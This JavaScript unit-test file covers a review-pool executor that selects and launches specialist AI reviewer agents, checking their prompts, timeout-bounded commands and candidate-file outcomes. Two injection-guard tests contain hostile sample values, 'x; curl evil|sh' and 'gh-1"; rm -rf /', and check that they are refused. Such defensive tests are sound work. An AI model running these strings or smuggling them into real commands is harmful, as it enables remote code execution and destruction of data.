/**
 * js/unit-tests/test_reviewPoolInJob.js — the gh-1471 IN-JOB round executor
 * (the redesign of the fire-and-forget leg dispatcher).
 *
 * Covers: the deterministic specialist selection (round type, rounds scope,
 * triggerPaths), the prompt contract (identity, lens path, candidates file,
 * head sha, no-posting rule), the bounded run-agent.sh command shape, and
 * both round halves — runSpecialists (execution + per-specialist outcome)
 * and readSpecialistOutcomes (the post action's file-view, same selection).
 * Fail-open semantics: timeout/crash/invalid/stale candidates all degrade
 * to `unavailable` without throwing.
 */
'use strict';

var assert = require('assert');
var path = require('path');
var os = require('os');
var fs = require('fs');

var inJob = require(path.resolve(__dirname, '../common/reviewPoolInJob.js'));
var candidatesModule = require(path.resolve(__dirname, '../common/reviewPoolCandidates.js'));


var HEAD = 'aaaabbbbccccddddeeeeffff0000111122223333';
var STALE = '9999888877776666555544443333222211110000';

function skillOf(name, overrides) {
    return Object.assign({
        name: name,
        lens: 'instructions/pr_review/' + name + '/lens.md',
        roleLine: 'Specialized reviewer — ' + name,
        mayRaise: ['BLOCKING', 'SUGGESTION'],
        rounds: ['first', 'hunks'],
        triggerPaths: [],
        isEnabled: true
    }, overrides || {});
}

var poolOf = function(reviewers) {
    return { reviewers: reviewers, policy: {}, warnings: [] };
};

var ctxOf = function(overrides) {
    return Object.assign({
        ticketKey: 'gh-1471',
        headSha: HEAD,
        hasNewHunks: false,
        newHunkPaths: []
    }, overrides || {});
};


// ── selection ────────────────────────────────────────────────────────────────

test('selection: enabled reviewers only', function() {
    var pool = poolOf([skillOf('general'), skillOf('off', { isEnabled: false })]);
    var got = inJob.selectSpecialists(pool, ctxOf());
    assert.deepStrictEqual(got.map(function(s) { return s.name; }), ['general']);
});

test('selection: rounds scope excludes the specialist on a first round', function() {
    var pool = poolOf([skillOf('general'), skillOf('hunksOnly', { rounds: ['hunks'] })]);
    var got = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: false }));
    assert.deepStrictEqual(got.map(function(s) { return s.name; }), ['general']);
    var hunks = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
    assert.deepStrictEqual(hunks.map(function(s) { return s.name; }), ['general', 'hunksOnly']);
});

test('selection: triggerPaths gate hunks-only reviewers; first-rounds reviewers run every pass', function() {
    var pool = poolOf([
        skillOf('general'),
        skillOf('scoped', { triggerPaths: ['js/'] }),
        skillOf('docsOnlyHunks', { rounds: ['hunks'], triggerPaths: ['docs/'] }),
        skillOf('jsOnlyHunks', { rounds: ['hunks'], triggerPaths: ['js/'] })
    ]);
    // The canonical §6 doctrine, per-run state (firstDone is always false in
    // a run): triggerPaths gate the HUNKS flag only — a first-rounds reviewer
    // runs on every pass; a hunks-only reviewer runs when its paths hit.
    var first = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: false, newHunkPaths: [] }));
    assert.deepStrictEqual(first.map(function(s) { return s.name; }),
        ['general', 'scoped'], 'a first pass runs the first-rounds reviewers');
    var hunks = inJob.selectSpecialists(pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/dep/file.js'] }));
    assert.deepStrictEqual(hunks.map(function(s) { return s.name; }),
        ['general', 'scoped', 'jsOnlyHunks'], 'the hunks round scopes hunks-only reviewers by triggerPaths');
});

test('the CWE-78 guard: a hostile reviewer name never composes a spawn command', function() {
    var spawned = [];
    var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
    var pool = poolOf([skillOf('x; curl evil|sh')]);
    var round = inJob.runSpecialists(io, pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
    assert.deepStrictEqual(round.completed, [], 'nothing completed');
    assert.deepStrictEqual(spawned, [], 'NO command was built');
    assert.strictEqual(round.unavailable[0], 'x; curl evil|sh');
    assert.ok(round.results[0].reason.indexOf('unsafe identifier') === 0,
        'the guard reason names the refusal');
});

test('the CWE-78 guard: a hostile ticket key is refused the same way', function() {
    var spawned = [];
    var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
    var pool = poolOf([skillOf('security')]);
    var round = inJob.runSpecialists(io, pool, ctxOf({ ticketKey: 'gh-1"; rm -rf /', hasNewHunks: true }));
    assert.deepStrictEqual(spawned, [], 'NO command built for a hostile ticket key');
    assert.deepStrictEqual(round.unavailable, ['security']);
});

test('roundTypeOf: first vs hunks', function() {
    assert.strictEqual(inJob.roundTypeOf(ctxOf({ hasNewHunks: false })), 'first');
    assert.strictEqual(inJob.roundTypeOf(ctxOf({ hasNewHunks: true })), 'hunks');
});

// ── prompt contract ──────────────────────────────────────────────────────────

test('prompt: identity, lens path, head sha, output file, no-posting rule', function() {
    var skill = skillOf('security');
    var prompt = inJob.buildSpecialistPrompt(skill, ctxOf());
    assert.ok(prompt.indexOf('security') !== -1, 'the reviewer name is present');
    assert.ok(prompt.indexOf(skill.lens) !== -1, 'the lens path is present');
    assert.ok(prompt.indexOf(HEAD) !== -1, 'the head sha is present');
    assert.ok(prompt.indexOf(inJob.candidatesPathOf('security')) !== -1, 'the candidates file is present');
    assert.ok(prompt.indexOf('no comments') !== -1, 'the no-posting rule is present');
    assert.ok(prompt.indexOf('"reviewer": "security"') !== -1, 'the strict JSON reviewer field is present');
});

// ── command shape (gh-775 bounded invocation) ────────────────────────────────

test('command: run-agent.sh under timeout -k 60 with a prompt file', function() {
    var command = inJob.buildSpecialistCommand('outputs/pool_specialist-security.md', 900);
    assert.ok(command.indexOf('timeout -k 60 900') !== -1, 'the hard wall-clock cap is present');
    assert.ok(command.indexOf('bash agents/scripts/run-agent.sh') !== -1, 'the wrapper is bash (the agents/-mounted pack path)');
    assert.ok(command.indexOf('outputs/pool_specialist-security.md') !== -1, 'the prompt rides a file');
});

test('command: the default timeout applies on garbage input', function() {
    var command = inJob.buildSpecialistCommand('x.md', 'nope');
    assert.ok(command.indexOf('timeout -k 60 ' + inJob.DEFAULT_SPECIALIST_TIMEOUT_SECONDS) !== -1);
});

// ── runSpecialists: execution + outcome split ────────────────────────────────

function recordingIo(outcomes) {
    var executed = [];
    var dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pool-injob-'));
    return {
        io: {
            executeCommand: function(command) {
                executed.push(command);
                var write = outcomes[executed.length - 1];
                if (typeof write === 'function') write(dir);
            },
            writeFile: function(p, content) {
                fs.mkdirSync(path.dirname(path.join(dir, p)), { recursive: true });
                fs.writeFileSync(path.join(dir, p), content);
            },
            readFile: function(p) {
                try {
                    return fs.readFileSync(path.join(dir, p), 'utf8');
                } catch (e) {
                    return null;
                }
            },
            nowIso: function() { return '2026-11-13T00:00:00Z'; }
        },
        executed: executed,
        dir: dir
    };
}

function candidatesFile(dir, reviewer, head, findings) {
    fs.mkdirSync(path.join(dir, 'outputs'), { recursive: true });
    var payload = {
        reviewer: reviewer, head: head,
        candidates: findings || [],
        count: (findings || []).length, truncated: false,
        at: '2026-11-13T00:00:00Z'
    };
    fs.writeFileSync(path.join(dir, inJob.candidatesPathOf(reviewer)),
        JSON.stringify(payload));
}

var pool = poolOf([skillOf('general'), skillOf('security'), skillOf('flaky')]);
// NOTE: 'base' (the posting reviewer) is excluded from the specialists by
// design — these fixtures use 'general' as a non-posting specialist name.

test('runSpecialists: completed vs unavailable, validated candidates only', function() {
    var outcomesSeq = [
        null, // base ran, no file → unavailable
        function(dir) { candidatesFile(dir, 'security', HEAD, []); },
        'THROW' // flaky timed out (the command threw)
    ];
    var t = recordingIo([]);
    t.io.executeCommand = function(command) {
        t.executed.push(command);
        var write = outcomesSeq[t.executed.length - 1];
        if (write === 'THROW') throw new Error('timeout -k 60 900 …');
        if (typeof write === 'function') write(t.dir);
    };
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.deepStrictEqual(round.completed, ['security']);
    assert.deepStrictEqual(round.unavailable, ['general', 'flaky']);
    assert.strictEqual(round.candidates.length, 1);
    assert.strictEqual(round.candidates[0].reviewer, 'security');
    assert.strictEqual(round.candidates[0].count, 0);
});

test('runSpecialists: stale candidates (wrong head) are unavailable', function() {
    var t = recordingIo([
        null,
        function(dir) { candidatesFile(dir, 'security', STALE, []); },
        null
    ]);
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.deepStrictEqual(round.completed, []);
    assert.strictEqual(round.unavailable.indexOf('security') !== -1, true);
});

test('runSpecialists: an invalid record degrades to unavailable (no throw)', function() {
    var t = recordingIo([
        null,
        function(dir) {
            fs.mkdirSync(path.join(dir, 'outputs'), { recursive: true });
            fs.writeFileSync(path.join(dir, inJob.candidatesPathOf('security')),
                '{"nope": true}');
        },
        null
    ]);
    var round = inJob.runSpecialists(t.io, pool, ctxOf());
    assert.deepStrictEqual(round.completed, []);
    var sec = round.results.filter(function(r) { return r.reviewer === 'security'; })[0];
    assert.ok(sec && sec.reason && sec.reason.indexOf('invalid candidates record') !== -1);
});

// ── readSpecialistOutcomes: the post action's file-view ─────────────────────

test('readSpecialistOutcomes: same selection, file-driven outcomes', function() {
    var t = recordingIo([]);
    candidatesFile(t.dir, 'security', HEAD, [{ severity: 'SUGGESTION', path: 'js/y.js', line: 2, body: 'b', claim: 'c' }]);
    var io = {
        readFile: function(p) {
            try {
                return fs.readFileSync(path.join(t.dir, p), 'utf8');
            } catch (e) {
                return null;
            }
        }
    };
    var out = inJob.readSpecialistOutcomes(io, pool, ctxOf());
    assert.deepStrictEqual(out.completed, ['security']);
    assert.deepStrictEqual(out.unavailable, ['general', 'flaky']);
    assert.strictEqual(out.candidates[0].candidates[0].path, 'js/y.js');
    // The record validates through the gh-1406 contract unchanged:
    assert.ok(candidatesModule.candidatesRecordFromPayload(out.candidates[0]));
});

test('readSpecialistOutcomes: every specialist unavailable on an empty workspace', function() {
    var out = inJob.readSpecialistOutcomes({ readFile: function() { return null; } }, pool, ctxOf());
    assert.deepStrictEqual(out.completed, []);
    assert.strictEqual(out.unavailable.length, 3);
});

